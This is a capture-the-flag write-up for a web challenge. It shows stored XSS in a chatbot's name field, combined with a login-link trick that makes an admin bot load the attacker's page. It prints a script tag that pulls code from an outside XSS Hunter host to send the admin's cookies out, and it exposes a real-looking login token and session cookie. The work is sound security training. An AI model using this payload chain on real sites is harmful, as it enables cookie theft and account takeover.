**DISCLAIMER**: Solved after competition ended.

>Meet our brand new personal assistant, Joe. He is the perfect talking partner if you want to have some small talk with a machine. We have put extra emphasis on security when developing Joe, but we'd like to invite you to participate in our H4x0r R3w4rd Pr06r4m (HRP) to help us make Joe even more secure. If you can find a vulnerability that makes it possible to steal the cookies of the administrator, we will reward you with a valuable flag.<br><br>Challenge running at https://joe.web.ctfcompetition.com/

Normally when a problem tells you to steal admin's cookies, your first thought should be XSS. XSS, or Cross-site scripting, is a type of computer security vulnerability typically found in websites. XSS allows attackers (like us) to inject scripts into web pages viewed by other users. With these scripts, you can steal a user's cookies or sensitive data The script normally is executed because the website won't sanitize user input, or the site will unknowingly allow you to input html code, which then you can put <script> tags and execute malicious JavaScript code. The easiest way to detect if a site is vulnerable to XSS is by doing `<script>alert(1)</script>`. If you see an alert show up, then the site is vulnerable to XSS.

So the plan with this problem is to steal the admin's cookies by using some kind of XSS injection.

When we first go to https://joe.web.ctfcompetition.com/, Joe introduces himself and explains a couple of commands we can use.

![Imgur](http://i.imgur.com/x1N62tK.png)

Looking at the [admin page](https://joe.web.ctfcompetition.com/admin), we find some useful information:

![Imgur](http://i.imgur.com/W0PTmVj.png)

So the admin has a FLAG cookie set, hence why we have to steal his cookies. Once we steal his cookies we just look at the value of the FLAG cookie and that will be our flag.

Looking at the other commands, the important ones are reporting a bug and changing Joe's name. When you report a bug, you have to fill out a captcha and then provide a link to the bug report, and the "admin" (probably a robot) will visit the link you give. You have to give a valid HTTP/HTTPS link (Joe checks for this), so you can't bypass that.

Looking at changing Joe's name: you can put an XSS injection when you change his name. Example: When you change Joe's name to `<script>alert(1)</script>` and reload the page, the page will alert you `1`, so that's where our XSS injection goes.

The issue now is that we can use XSS on ourselves, but how do we get the admin to change his Joe's name to our XSS injection so we can steal his cookies?

Another feature is that you can login and Joe will remember you, let's take a look at that.

Opening the developer tools on Chrome and looking at the "Network" tab, I login and take a look a different requests made. One of them is very interesting: https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY3ZDRlODdjN2I2NmVjZjMzMmYwNjBhOTdhNTlkMzE0OWM2YmY3MzUifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMTczNjg5NzEwOTIyNzU1NjA1MDkiLCJhdF9oYXNoIjoiWnBVTXdYRTdySFVzcGtvUUx4dldUZyIsImlzcyI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbSIsImlhdCI6MTQ5NzgzMzk1NCwiZXhwIjoxNDk3ODM3NTU0LCJuYW1lIjoiVmlzaHdhIEl5ZXIiLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDYuZ29vZ2xldXNlcmNvbnRlbnQuY29tLy1DeERIUlFPa2VScy9BQUFBQUFBQUFBSS9BQUFBQUFBQUFBQS9BQXlZQkY0MzB0OWZkS081Um9QZExEZFV3MlRzUTVGakpBL3M5Ni1jL3Bob3RvLmpwZyIsImdpdmVuX25hbWUiOiJWaXNod2EiLCJmYW1pbHlfbmFtZSI6Ikl5ZXIiLCJsb2NhbGUiOiJlbiJ9.B9P8UU01NO1bboQ9QMAPQ1tqGZjRvjy9psXNjqngia93JPTAtu1tT_Pq8-QwRIxgT7PZOm_kNC6jlrPevGybB9oHGwoqFqnNctfF4t-hDlky8OBb0KUQA1I6xqNniCA-pdXsmg6rCaj34LX6dPw9CcrTC7W4GRIlnO9KZD4BzCiQNUBZTCTUydwvkkBhrBOdzFOxMucjmTTdioIwaUorMyKTAqt1rXHJAioNEy0KjI87wuPOw2q24l1a-MZSlln7SK-QWyeBZU9s0mJtnXaOPzyJad-rat0MOLKAE1VvqLzH2oTyBOhC-Pir1HVdK_rA7EBerkcqYpGvcXU8ihVVTg. 

When we're logged out of the website and we click that link, we're automatically logged in to our account, no need to type any username or password. So how does this help us?

The plan is to use this link and send it to the admin when we report a bug. Then the admin will be logged into our account. Before we send the link however, we must change Joe's name to our malicious XSS injection. Then when the admin is logged in as us, the XSS will execute and we will get the admin's cookies and get our flag!

First step is change Joe's name. So we change Joe's name to `<script src=https://ddosattacks.xss.ht></script>`. If you're wondering why that link looks so weird, I would suggest looking at https://xsshunter.com, XSSHunter is an app that allows you to send custom XSS payloads to test for XSS on a website. It can gather a lot of information from a website like cookies, the actual HTML code, etc.

Second step is to report a bug. So we report a bug, fill out the captcha, and send that link. Unfortunately, Joe tells us the message is too long, so what do we do now? The answer: shorten the link using https://goo.gl/. Our shortened link is now https://goo.gl/nXFK6E, and that's what we send as our link for the bug report. 

Couple of minutes later we get the admin's cookie: `flag=CTF{h1-j03-c4n-1-h4v3-4-c00k13-plz!?!}; session="eyJ1c2VyX25hbWUiOiJWaXNod2EiLCJ1c2VyX2lkIjoiMTE3MzY4OTcxMDkyMjc1NTYwNTA5IiwidGFsa19zdGF0ZSI6MH0\075|1497831329|d3d9fa79190d5c4710ca86f6a7693ee0afbb22dd"`

Our flag is `CTF{h1-j03-c4n-1-h4v3-4-c00k13-plz!?!}`
